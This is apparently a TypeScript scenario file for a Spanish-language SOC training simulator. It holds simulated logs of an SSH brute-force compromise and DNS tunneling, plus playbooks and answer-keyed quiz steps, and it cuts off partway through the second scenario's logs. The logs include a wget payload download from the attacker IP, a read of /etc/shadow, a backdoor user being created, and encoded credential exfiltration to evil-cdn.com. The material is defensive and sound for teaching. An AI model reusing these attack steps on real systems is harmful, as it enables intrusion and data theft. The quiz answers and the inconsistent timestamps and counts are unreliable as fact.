export type Option = {
  id: string;
  label: string;
  correct: boolean;
  explanation: string;
  consequence?: string;
};

export type Step = {
  id: string;
  title: string;
  description: string;
  hint: string;
  options: Option[];
};

export type PlaybookEntry = {
  id: string;
  title: string;
  category: string;
  content: string;
};

export type LogEntry = {
  line: number;
  timestamp: string;
  source: string;
  message: string;
  severity: "info" | "warning" | "critical";
  flagged: boolean;
};

export type Scenario = {
  id: string;
  title: string;
  severity: "critical" | "high" | "medium";
  description: string;
  alertSource: string;
  alertTime: string;
  logs: LogEntry[];
  playbook: PlaybookEntry[];
  steps: Step[];
  summary: string;
};

export const SCENARIOS: Scenario[] = [
  {
    id: "brute-force-ssh",
    title: "Intentos SSH desde IP externa",
    severity: "critical",
    description:
      "El SIEM generó una alerta de brute force SSH contra srv-web-01. Se detectaron múltiples intentos fallidos seguidos de un acceso exitoso desde una IP no registrada.",
    alertSource: "Fail2ban + Wazuh Rule 5712",
    alertTime: "2026-08-24 03:14:22 UTC",
    logs: [
      { line: 1, timestamp: "Aug 24 02:45:12", source: "srv-web-01 nginx.access", message: "GET /api/health 200 — 10.10.2.44 — Lucía Fernández VPN", severity: "info", flagged: false },
      { line: 2, timestamp: "Aug 24 02:46:30", source: "srv-web-01 nginx.access", message: "GET /api/products?page=1 200 — 10.10.1.15 — Martín González Admin", severity: "info", flagged: false },
      { line: 3, timestamp: "Aug 24 02:48:05", source: "srv-web-01 nginx.access", message: "POST /api/payments/process 201 — 10.10.3.22 — Carlos Ruiz Corp", severity: "info", flagged: false },
      { line: 4, timestamp: "Aug 24 02:49:18", source: "srv-monitor cron", message: "Health check: srv-web-01 — CPU 22% — RAM 48% — Disk 61%", severity: "info", flagged: false },
      { line: 5, timestamp: "Aug 24 02:50:03", source: "srv-web-01 nginx.access", message: "GET /api/users/me 200 — 10.10.1.20 — Diego López SOC", severity: "info", flagged: false },
      { line: 6, timestamp: "Aug 24 02:51:15", source: "srv-mail-01 postfix/smtpd", message: "connect from mail.corp.local[10.10.5.10]", severity: "info", flagged: false },
      { line: 7, timestamp: "Aug 24 02:52:30", source: "srv-web-01 fail2ban", message: "Ban action for sshd on 45.33.32.156 — 5 failures in 200s — duration 1800s", severity: "warning", flagged: false },
      { line: 8, timestamp: "Aug 24 02:53:44", source: "srv-web-01 sshd[22180]", message: "Accepted publickey for diego from 10.10.1.20 port 49201 ssh2", severity: "info", flagged: false },
      { line: 9, timestamp: "Aug 24 02:54:10", source: "srv-web-01 nginx.access", message: "GET /dashboard 200 — 10.10.1.20 — Diego López SOC", severity: "info", flagged: false },
      { line: 10, timestamp: "Aug 24 02:55:00", source: "srv-web-01 node.app", message: "Queue processor: 127 jobs completed, 34 pending", severity: "info", flagged: false },
      { line: 11, timestamp: "Aug 24 02:56:22", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=203.0.113.44 DST=10.10.1.10 PROTO=TCP SPT=4444 DPT=22", severity: "info", flagged: false },
      { line: 12, timestamp: "Aug 24 02:57:30", source: "srv-web-01 sshd[22195]", message: "Accepted publickey for lucia from 10.10.2.44 port 49302 ssh2", severity: "info", flagged: false },
      { line: 13, timestamp: "Aug 24 02:58:15", source: "srv-web-01 nginx.access", message: "POST /api/auth/login 200 — 10.10.1.15 — Martín González Admin", severity: "info", flagged: false },
      { line: 14, timestamp: "Aug 24 02:59:00", source: "srv-monitor cron", message: "Log rotation completed — archived 48MB of logs to /var/log/archive/", severity: "info", flagged: false },
      { line: 15, timestamp: "Aug 24 03:00:45", source: "srv-mail-01 postfix/smtp", message: "BA5F2E01: to=<admin@corp.local>, relay=none, delay=0.12, dsn=2.0.0, status=sent (250 OK)", severity: "info", flagged: false },
      { line: 16, timestamp: "Aug 24 03:12:01", source: "srv-web-01 sshd[22311]", message: "Failed password for root from 185.220.101.7 port 51234 ssh2", severity: "warning", flagged: true },
      { line: 17, timestamp: "Aug 24 03:12:04", source: "srv-web-01 sshd[22313]", message: "Failed password for root from 185.220.101.7 port 51240 ssh2", severity: "warning", flagged: true },
      { line: 18, timestamp: "Aug 24 03:12:07", source: "srv-web-01 sshd[22315]", message: "Failed password for root from 185.220.101.7 port 51255 ssh2", severity: "warning", flagged: true },
      { line: 19, timestamp: "Aug 24 03:12:11", source: "srv-web-01 sshd[22317]", message: "Failed password for invalid user admin from 185.220.101.7 port 51261 ssh2", severity: "warning", flagged: true },
      { line: 20, timestamp: "Aug 24 03:12:15", source: "srv-web-01 sshd[22319]", message: "Failed password for root from 185.220.101.7 port 51270 ssh2", severity: "warning", flagged: true },
      { line: 21, timestamp: "Aug 24 03:12:19", source: "srv-web-01 sshd[22321]", message: "Failed password for root from 185.220.101.7 port 51288 ssh2", severity: "warning", flagged: true },
      { line: 22, timestamp: "Aug 24 03:12:23", source: "srv-web-01 sshd[22323]", message: "Failed password for root from 185.220.101.7 port 51299 ssh2", severity: "warning", flagged: true },
      { line: 23, timestamp: "Aug 24 03:12:26", source: "srv-web-01 sshd[22325]", message: "Failed password for invalid user postgres from 185.220.101.7 port 51301 ssh2", severity: "warning", flagged: true },
      { line: 24, timestamp: "Aug 24 03:12:29", source: "srv-web-01 sshd[22327]", message: "Failed password for root from 185.220.101.7 port 51305 ssh2", severity: "warning", flagged: true },
      { line: 25, timestamp: "Aug 24 03:12:32", source: "srv-web-01 sshd[22329]", message: "Failed password for invalid user ubuntu from 185.220.101.7 port 51307 ssh2", severity: "warning", flagged: true },
      { line: 26, timestamp: "Aug 24 03:12:35", source: "srv-web-01 sshd[22331]", message: "Failed password for root from 185.220.101.7 port 51308 ssh2", severity: "warning", flagged: true },
      { line: 27, timestamp: "Aug 24 03:12:38", source: "srv-web-01 sshd[22333]", message: "Failed password for invalid user deploy from 185.220.101.7 port 51309 ssh2", severity: "warning", flagged: true },
      { line: 28, timestamp: "Aug 24 03:12:41", source: "srv-web-01 sshd[22335]", message: "Failed password for root from 185.220.101.7 port 51310 ssh2", severity: "warning", flagged: true },
      { line: 29, timestamp: "Aug 24 03:05:44", source: "srv-web-01 fail2ban", message: "Ban action for sshd on 185.220.101.7 — 7 failures in 300s — duration 3600s", severity: "warning", flagged: true },
      { line: 30, timestamp: "Aug 24 03:13:10", source: "srv-web-01 nginx.access", message: "GET /api/health 200 — 10.10.2.44 — Lucía Fernández VPN", severity: "info", flagged: false },
      { line: 31, timestamp: "Aug 24 03:14:00", source: "srv-monitor cron", message: "Health check: srv-web-01 — CPU 18% — RAM 45% — Disk 61%", severity: "info", flagged: false },
      { line: 32, timestamp: "Aug 24 03:15:20", source: "srv-web-01 node.app", message: "Queue processor: 98 jobs completed, 22 pending", severity: "info", flagged: false },
      { line: 33, timestamp: "Aug 24 03:16:33", source: "srv-web-01 sshd[22401]", message: "Accepted publickey for sofia from 10.10.3.10 port 49401 ssh2", severity: "info", flagged: false },
      { line: 34, timestamp: "Aug 24 03:17:15", source: "srv-web-01 nginx.access", message: "GET /dashboard 200 — 10.10.1.20 — Diego López SOC", severity: "info", flagged: false },
      { line: 35, timestamp: "Aug 24 03:18:00", source: "srv-monitor cron", message: "Metric aggregation completed — 14,203 events processed", severity: "info", flagged: false },
      { line: 36, timestamp: "Aug 24 03:19:45", source: "srv-mail-01 postfix/smtp", message: "D3A1B2C4: to=<team@corp.local>, relay=mail.corp.local[10.10.5.10], delay=0.08, status=sent (250 OK)", severity: "info", flagged: false },
      { line: 37, timestamp: "Aug 24 03:20:30", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=198.51.100.77 DST=10.10.1.10 PROTO=TCP SPT=8080 DPT=443", severity: "info", flagged: false },
      { line: 38, timestamp: "Aug 24 03:21:10", source: "srv-web-01 nginx.access", message: "POST /api/reports/generate 202 — 10.10.1.15 — Martín González Admin", severity: "info", flagged: false },
      { line: 39, timestamp: "Aug 24 03:22:00", source: "srv-web-01 fail2ban", message: "sshd: Currently banned IPs: 45.33.32.156, 185.220.101.7 — total 2", severity: "info", flagged: false },
      { line: 40, timestamp: "Aug 24 03:22:45", source: "srv-web-01 sshd[22410]", message: "Disconnected from 10.10.1.20 port 49201 [preauth]", severity: "info", flagged: false },
      { line: 41, timestamp: "Aug 24 03:12:44", source: "srv-web-01 sshd[22340]", message: "Accepted password for root from 185.220.101.7 port 51310 ssh2", severity: "critical", flagged: true },
      { line: 42, timestamp: "Aug 24 03:13:02", source: "srv-web-01 sudo: root", message: "TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow", severity: "critical", flagged: true },
      { line: 43, timestamp: "Aug 24 03:13:15", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=185.220.101.7 DST=10.10.5.20 PROTO=TCP SPT=51310 DPT=5432", severity: "warning", flagged: true },
      { line: 44, timestamp: "Aug 24 03:13:40", source: "srv-web-01 useradd", message: "new user 'svc-backup' (uid=1005) added to /etc/passwd", severity: "critical", flagged: true },
      { line: 45, timestamp: "Aug 24 03:14:05", source: "srv-web-01 wget", message: "connecting to 185.220.101.7:8080 — downloading payload.tar.gz — saved to /tmp/.cache_update", severity: "critical", flagged: true },
      { line: 46, timestamp: "Aug 24 03:25:00", source: "srv-web-01 nginx.access", message: "GET /api/products?page=2 200 — 10.10.2.44 — Lucía Fernández VPN", severity: "info", flagged: false },
      { line: 47, timestamp: "Aug 24 03:26:30", source: "srv-web-01 node.app", message: "Queue processor: 112 jobs completed, 18 pending", severity: "info", flagged: false },
      { line: 48, timestamp: "Aug 24 03:27:15", source: "srv-web-01 sshd[22450]", message: "Accepted publickey for carlos from 10.10.3.22 port 49501 ssh2", severity: "info", flagged: false },
      { line: 49, timestamp: "Aug 24 03:28:00", source: "srv-monitor cron", message: "Health check: srv-web-01 — CPU 20% — RAM 50% — Disk 61%", severity: "info", flagged: false },
      { line: 50, timestamp: "Aug 24 03:29:30", source: "srv-mail-01 postfix/qmgr", message: "BA5F2E02: from=<alerts@monitoring.local>, size=1204, nrcpt=1 (queue active)", severity: "info", flagged: false },
      { line: 51, timestamp: "Aug 24 03:30:10", source: "srv-web-01 nginx.access", message: "POST /api/auth/login 200 — 10.10.3.10 — Sofía Ramírez Ops", severity: "info", flagged: false },
      { line: 52, timestamp: "Aug 24 03:31:45", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=192.0.2.55 DST=10.10.1.10 PROTO=TCP SPT=3389 DPT=3389", severity: "info", flagged: false },
      { line: 53, timestamp: "Aug 24 03:32:20", source: "srv-web-01 sshd[22465]", message: "Accepted publickey for martinez from 10.10.1.15 port 49601 ssh2", severity: "info", flagged: false },
      { line: 54, timestamp: "Aug 24 03:33:00", source: "srv-monitor cron", message: "Backup verification: checksums match for /var/log/archive/ — 48MB", severity: "info", flagged: false },
      { line: 55, timestamp: "Aug 24 03:34:15", source: "srv-web-01 node.app", message: "Payment processor health: latency 12ms — throughput 847 req/s", severity: "info", flagged: false },
    ],
    playbook: [
      {
        id: "PB-SSH-001",
        title: "Brute Force SSH — Protocolo de respuesta",
        category: "Acceso no autorizado",
        content:
          "1. Verificar si el acceso exitoso es legítimo (usuario, horario, IP conocida)\n2. Si la IP es desconocida → escalar inmediatamente\n3. Revocar sesiones activas del usuario comprometido\n4. Forzar rotación de credenciales\n5. Bloquear IP en firewall perimetral\n6. Buscar indicadores de compromiso post-acceso (descargas, cron jobs, usuarios creados)\n7. Documentar timeline completa en ticket",
      },
      {
        id: "PB-ACC-002",
        title: "Criterios de clasificación de alertas",
        category: "Clasificación",
        content:
          "POSITIVO VERDADERO: IP externa + acceso exitoso + actividad post-acceso anómala\nFALSO POSITIVO: IP interna conocida + horario laboral + patrón consistente con uso normal\nREQUIERE INVESTIGACIÓN: IP desconocida sin acceso exitoso o con acceso pero sin actividad posterior",
      },
    ],
    steps: [
      {
        id: "identify",
        title: "Paso 1 — Identificar los logs relevantes",
        description:
          "Revisá el log y determiná cuáles líneas son relevantes para la alerta. Seleccioná las que contienen actividad sospechosa.",
        hint: "Mirá las IPs, los intentos de acceso, y si hubo éxito o no.",
        options: [
          {
            id: "a",
            label:
              "Solo las líneas 16-22 (los intentos fallidos de 185.220.101.7)",
            correct: false,
            explanation:
              "Estás ignorando el login exitoso, el comando sudo y el intento de conexión a la DB. La gravedad del incidente no está solo en los fallos, sino en lo que pasó después del acceso exitoso.",
            consequence:
              "En un SOC real, ignorar los eventos post-acceso significaría no detectar que el atacante ya tiene acceso root, está leyendo /etc/shadow, intentando moverse lateralmente a la base de datos y creando usuarios backdoor. Mientras investigás solo los fallos, el atacante Roba credenciales y establece persistencia.",
          },
          {
            id: "b",
            label:
              "Líneas 16-29 y 41-45 (todos los eventos de 185.220.101.7 incluyendo el éxito y post-explotación)",
            correct: true,
            explanation:
              "Correcto. La IP 185.220.101.7 es externa y ejecutó una secuencia completa: brute force → acceso exitoso → lectura de /etc/shadow → intento de conexión a la DB → creación de usuario → descarga de payload. Todo es parte del mismo incidente.",
          },
          {
            id: "c",
            label:
              "Todas las entradas del log (líneas 1-55)",
            correct: false,
            explanation:
              "Las líneas normales incluyen tráfico de Lucía, Carlos, health checks y otros usuarios legítimos. No son parte del incidente. Incluir todo ensucia el análisis y dificulta la investigación.",
            consequence:
              "En un SOC real, entregar un reporte con 55 líneas de 'evidencia' donde la mitad es tráfico legítimo hace que el equipo de contención pierda horas revisando activity normal. Mientras tanto, el atacante sigue activo moviéndose lateralmente.",
          },
          {
            id: "d",
            label:
              "Solo la línea 41 (el login exitoso)",
            correct: false,
            explanation:
              "El login exitoso es el punto de inflexión, pero necesitás ver los intentos previos para confirmar que fue brute force, y los eventos posteriores para entender el alcance del compromiso.",
            consequence:
              "En un SOC real, reportar solo el login exitoso sin contexto haría que el equipo no dimensione la gravedad. No verían el brute force previo ni la post-explotación, y podrían tratar esto como un login normal en lugar de un ataque activo.",
          },
        ],
      },
      {
        id: "assign",
        title: "Paso 2 — Asignar el incidente",
        description:
          "Basándote en la información de la empresa, ¿quién debería tomar este caso?",
        hint: "Revisá los roles, IPs y el tipo de alerta. Considerá quién tiene acceso al servidor afectado.",
        options: [
          {
            id: "a",
            label: "Carlos Ruiz (Analista Financiero)",
            correct: false,
            explanation:
              "Carlos está en Finanzas (VLAN 30) y no tiene responsabilidad sobre srv-web-01. No tiene las credenciales ni el conocimiento técnico para responder a un compromiso SSH.",
            consequence:
              "En un SOC real, asignar un incidente a la persona equivocada retrasa la respuesta horas. Carlos tendría que contactar a IT para entender qué está pasando, mientras el atacante sigue activo en el servidor.",
          },
          {
            id: "b",
            label:
              "Martín González (SysAdmin Senior — VLAN 10 Admin)",
            correct: false,
            explanation:
              "Martín podría ayudar con la contención técnica, pero como SysAdmin no es el primero en la cadena de respuesta de seguridad. Debería ser contactado después del SOC.",
            consequence:
              "En un SOC real, escalar directamente al SysAdmin sin pasar por el SOC bypass el proceso de clasificación. Si no se investiga primero, podrías estar escalando un falso positivo o perdiendo evidencia crítica que solo un analista de seguridad notaría.",

          },
          {
            id: "c",
            label:
              "Diego López (SOC Analyst L2 — Seguridad)",
            correct: true,
            explanation:
              "Correcto. Diego es SOC Analyst L2 en VLAN 10 Admin. Su rol es recibir alertas, clasificar incidentes y escalar. Él debería ser el primero en tomar el caso y decidir si escalar a Martín para la contención.",
          },
          {
            id: "d",
            label: "Sofía Ramírez (Gerente de Operaciones)",
            correct: false,
            explanation:
              "Sofía es gerente operativa, no técnica. Su involvement sería posterior si se necesita comunicación con management o clientes afectados. No es la primera línea de respuesta.",
            consequence:
              "En un SOC real, involucrar a un gerente antes de que el equipo técnico confirme el incidente genera alarma innecesaria y presión para cerrar rápido sin investigación adecuada.",

          },
        ],
      },
      {
        id: "playbook",
        title: "Paso 3 — Consultar el playbook",
        description:
          "Revisá el playbook de la empresa. Según el PB-SSH-001, ¿cuál es el primer paso crítico después de detectar acceso exitoso desde IP externa?",
        hint: "Leé el protocolo de respuesta y pensá en qué se verifica primero.",
        options: [
          {
            id: "a",
            label: "Bloquear la IP en el firewall inmediatamente",
            correct: false,
            explanation:
              "Bloquear la IP es parte de la contención, pero el protocolo dice verificar primero si el acceso es legítimo. Si bloqueás antes de investigar, podrías cortar una conexión legítima de un administrador remoto.",
            consequence:
              "En un SOC real, bloquear una IP sin verificar si hay un administrador legítimo usando VPN podría cortar el acceso remoto de emergencia del equipo de TI, dejando la infraestructura sin soporte durante un incidente real.",

          },
          {
            id: "b",
            label:
              "Verificar si el acceso es legítimo (usuario, horario, IP conocida)",
            correct: true,
            explanation:
              "Correcto. El playbook indica: 'Verificar si el acceso es legítimo (usuario, horario, IP conocida)'. En este caso, root desde una IP rusa a las 3 AM claramente NO es legítimo.",
          },
          {
            id: "c",
            label: "Forzar rotación de credenciales del usuario",
            correct: false,
            explanation:
              "La rotación de credenciales es el paso 4 del protocolo. Primero necesitás confirmar que es un incidente real antes de tomar medidas que afecten al usuario.",
            consequence:
              "En un SOC real, forzar rotación de credenciales sin confirmar el incidente puede interrumpir procesos automatizados que dependen de esas credenciales, causando caídas en servicios de producción.",

          },
          {
            id: "d",
            label: "Crear ticket en Jira y esperar",
            correct: false,
            explanation:
              "Esperar no es una opción cuando hay un compromiso activo. El ticket se crea, pero la respuesta inmediata es verificar y contener, no sentarse a esperar.",
            consequence:
              "En un SOC real, esperar con un compromiso activo permite que el atacante complete su objetivo: robar datos, instalar backdoors, o moverse lateralmente. Cada minuto de inacción aumenta el daño.",

          },
        ],
      },
      {
        id: "classify",
        title: "Paso 4 — Clasificar: ¿Falso positivo o positivo verdadero?",
        description:
          "Con toda la información recopilada, ¿cuál es tu clasificación de esta alerta?",
        hint: "Considerá: IP externa, horario no laboral, acceso root exitoso, activity post-acceso.",
        options: [
          {
            id: "a",
            label: "Falso positivo",
            correct: false,
            explanation:
              "No hay forma de justificar esto como falso positivo. IP externa desconocida + brute force + root access + lectura de /etc/shadow a las 3 AM = compromiso confirmado.",
            consequence:
              "En un SOC real, marcar esto como falso positivo significaría ignorar un compromiso activo. El atacante seguiría dentro del servidor robando datos y moviéndose lateralmente durante horas o días antes de que alguien lo detecte.",

          },
          {
            id: "b",
            label:
              "Positivo verdadero — Brute force con compromiso confirmado",
            correct: true,
            explanation:
              "Correcto. Es un positivo verdadero. La secuencia de eventos demuestra un ataque exitoso: reconocimiento (intentos con usuarios variados), acceso (password correcto), y post-explotación (sudo, intento de lateral movement a la DB).",
          },
          {
            id: "c",
            label: "Requiere más investigación",
            correct: false,
            explanation:
              "Con los indicadores disponibles (IP externa, acesso root, /etc/shadow, intento de conexión a DB), ya hay suficiente evidencia para clasificar como positivo. Más investigación se hace DURANTE la fase de contención, no para decidir si es real.",
            consequence:
              "En un SOC real, demorar la clasificación bajo el pretexto de \"más investigación\" permite que el atacante siga activo. La clasificación no es el momento de dudar cuando la evidencia es clara.",

          },
        ],
      },
      {
        id: "writeup",
        title: "Paso 5 — Redacción del reporte",
        description:
          "Escribí el resumen del incidente. ¿Cuál es la redacción recomendada para documentar este positivo verdadero?",
        hint: "El reporte debe ser claro, conciso y seguir el formato de un SOC profesional.",
        options: [
          {
            id: "a",
            label:
              "Se detectó activity sospechosa en el servidor. Revisar y tomar acciones.",
            correct: false,
            explanation:
              "Demasiado vago. No menciona IP, timing, impacto ni evidencia. Un reporte así no sirve para escalamiento, forensic ni auditoría.",
            consequence:
              "En un SOC real, un reporte así de vago genera confusión: el equipo de contención no sabe qué servidor bloquear, el management no entiende la gravedad, y en auditoría no hay evidencia documentada del incidente.",

          },
          {
            id: "b",
            label:
              "Brute force exitoso desde IP externa 185.220.101.7 contra srv-web-01 (root). Acceso confirmado a las 03:12:44 UTC. Post-acceso: lectura de /etc/shadow y tentativa de conexión a srv-db-01 (Puerto 5432 bloqueado por UFW). Impacto: compromiso de credenciales root del servidor web. Acciones requeridas: revocar sesiones, rotar credenciales, bloquear IP, forense de srv-web-01.",
            correct: true,
            explanation:
              "Correcto. Esta redacción incluye: QUÉ pasó (brute force exitoso), DESDE DÓNDE (IP externa), CUÁNDO (timestamp), QUÉ SE AFECTÓ (srv-web-01 root), EVIDENCIA POST-ACCESO (/etc/shadow, intento de DB), IMPACTO, y ACCIONES REQUERIDAS. Es el formato estándar de un SOC profesional.",
          },
          {
            id: "c",
            label:
              "Hubo un hackeo al server. El atacante entró por SSH y leyó archivos. Hay que cambiar las contraseñas.",
            correct: false,
            explanation:
              "Lenguaje informal y sin datos técnicos. 'Hackeo' no es un término profesional. Falta IP, timestamp, servidor específico, archivos accionados, y plan de acción concreto.",
            consequence:
              "En un SOC real, un reporte sin datos técnicos no puede usarse para forensic, legal o auditoría. Si el incidente escala a nivel regulatorio, este reporte no sirve como evidencia documental.",

          },
        ],
      },
      {
        id: "return",
        title: "Paso 6 — Volver al panel",
        description:
          "Investigación completada. ¿Qué hacés ahora?",
        hint: "Pensá en el flujo de trabajo de un SOC analyst.",
        options: [
          {
            id: "a",
            label:
              "Cerrar el caso y olvidarlo",
            correct: false,
            explanation:
              "Nunca se cierra un caso sin verificar que las acciones de contención se ejecutaron. El cierre requiere evidencia de remediación.",
            consequence:
              "En un SOC real, cerrar un caso sin verificar remediación significa que el atacante podría seguir teniendo acceso. El incidente se reabrirá días después con mayor impacto cuando otros lo detecten.",

          },
          {
            id: "b",
            label:
              "Escalar a Martín para ejecutar la contención técnica y volver al panel de logs para revisar más alertas",
            correct: true,
            explanation:
              "Correcto. El flujo SOC es: detectar → clasificar → escalar → contener → remediar. Tu trabajo como analyst es clasificar y escalar. Volvés al panel para seguir monitoreando mientras el SysAdmin ejecuta la contención.",
          },
          {
            id: "c",
            label:
              "Intentar bloquear la IP vos mismo desde la terminal",
            correct: false,
            explanation:
              "Como SOC analyst, no deberías ejecutar cambios de infraestructura directamente. Eso es responsabilidad del SysAdmin/NetOps. Tu rol es reportar y escalar.",
            consequence:
              "En un SOC real, ejecutar cambios de infraestructura sin autorización puede causar downtime accidental y sin audit trail. Si el bloqueo falla o afecta servicios legítimos, no hay documentación de quién lo hizo ni por qué.",

          },
        ],
      },
    ],
    summary:
      "Este incidente demuestra un ataque de fuerza bruta exitoso contra srv-web-01. La IP 185.220.101.7 (Rusia) realizó 7 intentos fallidos antes de obtener acceso root. Post-acceso, el atacante intentó leer /etc/shadow y conectar a la base de datos PostgreSQL (bloqueado por UFW). Clasificación: POSITIVO VERDADERO — Compromiso confirmado.",
  },
  {
    id: "dns-tunneling",
    title: "Tráfico DNS anómalo",
    severity: "high",
    description:
      "El sistema de monitoreo detectó un volumen inusual de consultas DNS salientes desde srv-app-01 hacia un dominio externo no registrado en el asset inventory.",
    alertSource: "Zeek DNS Log + Custom Sigma Rule",
    alertTime: "2026-08-24 14:22:05 UTC",
    logs: [
      { line: 1, timestamp: "Aug 24 14:00:05", source: "srv-app-01 zeek.dns", message: "Query: www.google.com — Type: A — Response: 142.250.80.4 — TTL: 300", severity: "info", flagged: false },
      { line: 2, timestamp: "Aug 24 14:01:12", source: "srv-app-01 zeek.dns", message: "Query: api.github.com — Type: A — Response: 140.82.121.3 — TTL: 60", severity: "info", flagged: false },
      { line: 3, timestamp: "Aug 24 14:02:30", source: "srv-app-01 zeek.dns", message: "Query: registry.npmjs.org — Type: A — Response: 104.16.24.35 — TTL: 120", severity: "info", flagged: false },
      { line: 4, timestamp: "Aug 24 14:03:15", source: "srv-app-01 zeek.dns", message: "Query: acme-v02.api.letsencrypt.org — Type: A — Response: 104.75.142.132 — TTL: 60", severity: "info", flagged: false },
      { line: 5, timestamp: "Aug 24 14:04:00", source: "srv-app-01 nginx.access", message: "GET /api/products 200 — 10.10.2.44 — Lucía Fernández Dev", severity: "info", flagged: false },
      { line: 6, timestamp: "Aug 24 14:04:30", source: "srv-app-01 node.app", message: "Health check passed — uptime 14d 7h 32m", severity: "info", flagged: false },
      { line: 7, timestamp: "Aug 24 14:05:10", source: "srv-app-01 zeek.dns", message: "Query: stats.stackexchange.com — Type: A — Response: 104.244.42.1 — TTL: 300", severity: "info", flagged: false },
      { line: 8, timestamp: "Aug 24 14:06:00", source: "srv-monitor cron", message: "Health check: srv-app-01 — CPU 38% — RAM 55% — Disk 69%", severity: "info", flagged: false },
      { line: 9, timestamp: "Aug 24 14:07:22", source: "srv-app-01 zeek.dns", message: "Query: update.googleapis.com — Type: A — Response: 142.250.185.131 — TTL: 180", severity: "info", flagged: false },
      { line: 10, timestamp: "Aug 24 14:08:45", source: "srv-app-01 node.app", message: "Worker process restarted — PID 28441 — config reloaded", severity: "info", flagged: false },
      { line: 11, timestamp: "Aug 24 14:10:03", source: "srv-app-01 zeek.dns", message: "Query: aGVsbG8gd29ybGQ.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 12, timestamp: "Aug 24 14:10:03", source: "srv-app-01 zeek.dns", message: "Query: cGF5bG9hZC5iaW4.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 13, timestamp: "Aug 24 14:10:05", source: "srv-app-01 zeek.dns", message: "Query: dG9rZW49YWJjMTIz.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 14, timestamp: "Aug 24 14:10:05", source: "srv-app-01 zeek.dns", message: "Query: c2VjcmV0X2RhdGE.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 15, timestamp: "Aug 24 14:10:08", source: "srv-app-01 zeek.dns", message: "Query: ZXhmaWx0cmF0ZS5iaW4.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 16, timestamp: "Aug 24 14:10:08", source: "srv-app-01 zeek.dns", message: "Query: Y3JlZF9jYXJkPTQ1.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 17, timestamp: "Aug 24 14:10:12", source: "srv-app-01 zeek.dns", message: "Query: dXNlcm5hbWVfYWRta.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 18, timestamp: "Aug 24 14:10:12", source: "srv-app-01 zeek.dns", message: "Query: cGFzc3dvcmQ9c3Vw.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 19, timestamp: "Aug 24 14:10:15", source: "srv-app-01 zeek.dns", message: "Query: c2VycmV0X3Bhc3N3b3Jk.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 20, timestamp: "Aug 24 14:10:18", source: "srv-app-01 zeek.dns", message: "Query: YWRtaW5AbWVkaWEuY29t.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 21, timestamp: "Aug 24 14:10:20", source: "srv-app-01 zeek.dns", message: "Query: cGF5bWVudF9kYXRhLnhtbA.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 22, timestamp: "Aug 24 14:10:22", source: "srv-app-01 zeek.dns", message: "Query: c3NvX3Rva2VuXzEyMzQ1.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 23, timestamp: "Aug 24 14:10:24", source: "srv-app-01 zeek.dns", message: "Query: Y3Z2XzIwMjZfMDAx.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 24, timestamp: "Aug 24 14:10:26", source: "srv-app-01 zeek.dns", message: "Query: aXbjX2RhdGEueHl6.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 25, timestamp: "Aug 24 14:10:28", source: "srv-app-01 zeek.dns", message: "Query: cm9vdF9wd2Q9cGFzc3dvcmQxMjM.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "info", flagged: true },
      { line: 26, timestamp: "Aug 24 14:11:00", source: "srv-app-01 nginx.access", message: "POST /api/payments/process 200 — 10.10.2.44 — Lucía Fernández", severity: "info", flagged: false },
      { line: 27, timestamp: "Aug 24 14:11:30", source: "srv-monitor cron", message: "Health check: srv-app-01 — CPU 45% — RAM 62% — Disk 71%", severity: "info", flagged: false },
      { line: 28, timestamp: "Aug 24 14:12:00", source: "srv-app-01 node.app", message: "Payment processor responded normally — 142 transactions in queue", severity: "info", flagged: false },
      { line: 29, timestamp: "Aug 24 14:12:15", source: "srv-app-01 nginx.access", message: "GET /api/health 200 — 10.10.1.15 — Martín González Admin", severity: "info", flagged: false },
      { line: 30, timestamp: "Aug 24 14:12:45", source: "srv-app-01 node.app", message: "SSL certificate renewal check — expires in 23 days", severity: "info", flagged: false },
      { line: 31, timestamp: "Aug 24 14:13:10", source: "srv-app-01 nginx.access", message: "GET /api/orders/history 200 — 10.10.3.22 — Carlos Ruiz Corp", severity: "info", flagged: false },
      { line: 32, timestamp: "Aug 24 14:13:30", source: "srv-monitor cron", message: "Metric aggregation: 8,421 events — avg latency 14ms", severity: "info", flagged: false },
      { line: 33, timestamp: "Aug 24 14:14:00", source: "srv-app-01 zeek.dns", message: "Query: grafana.internal.corp — Type: A — Response: 10.10.1.30 — TTL: 60", severity: "info", flagged: false },
      { line: 34, timestamp: "Aug 24 14:14:20", source: "srv-app-01 node.app", message: "Cache hit ratio: 94.2% — Redis memory: 256MB/512MB", severity: "info", flagged: false },
      { line: 35, timestamp: "Aug 24 14:14:45", source: "srv-app-01 nginx.access", message: "POST /api/auth/refresh 200 — 10.10.1.20 — Diego López SOC", severity: "info", flagged: false },
